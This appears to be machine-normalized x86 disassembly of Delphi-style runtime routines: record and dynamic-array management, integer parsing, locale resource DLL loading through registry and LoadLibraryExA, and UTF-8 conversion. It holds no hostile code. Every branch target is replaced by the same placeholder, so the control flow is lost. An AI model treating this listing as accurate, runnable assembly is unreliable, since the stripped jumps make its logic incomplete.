push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404ae8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404ab8
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404b88
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404bd4
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404bd4
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_404144
jmp r-xdata
call sub_404120
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404844
jmp r-xdata
call sub_40482c
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404bbc
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404bd4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404b88
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405b50
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4054a4
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402910
sub_404ce4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4029b0
mov edx [ eax + esi ]
add eax ebx
call sub_404174
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404868
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404ccc
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4029b0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404e00
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404ce4
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405b68
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4054e0
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404e00
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404174
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404868
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404ccc
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404e00
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404ce4
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405b68
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4054e0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402910
sub_404f24
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404998
mov edx eax
mov ecx esi
mov eax ebx
call sub_404f18
pop edx
pop esi
pop ebx
retn
sub_404f48
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4043e0
mov ecx eax
mov eax esp
mov edx ebx
call sub_40488c
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404f74
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404f98
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402b3c
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402b3c
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404f74
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_4051f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4051f0
jmp r-xdata
mov al 0x4
call sub_402910
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402910
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027f4
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4027b4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402da4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404bd4
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4029b0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402da4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_4051d8
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4051f8
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405390
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_4054a4
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_4053b0
pop ebx
retn
sub_4053b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4051f0
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_4027b4
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4029b0
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402da4
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4051d8
jmp r-xdata
sub_4054a4
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4027d4
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404bd4
sub_4054e0
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4054a4
pop edx
pop eax
sub_405508
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4013c4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405538
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401354
mov eax esp
mov dl 0x1
call sub_405774
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405580
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405538
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4055bc
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40135c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401364
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4055a8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4055a8
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4055a8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405774
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401354
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013ac
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405879
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4055bc
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4013b4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4013ac
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013a4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013b4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013ac
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401374
push eax
call sub_40134c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405a14
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4027d4
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4027d4
jmp r-xdata
sub_405a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405aaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405ae0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405b44
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_405a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b4b
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405b68
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405b94
test edx edx
je sub_405b50
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402910
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405c7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405d58
push ebp
mov ebp esp
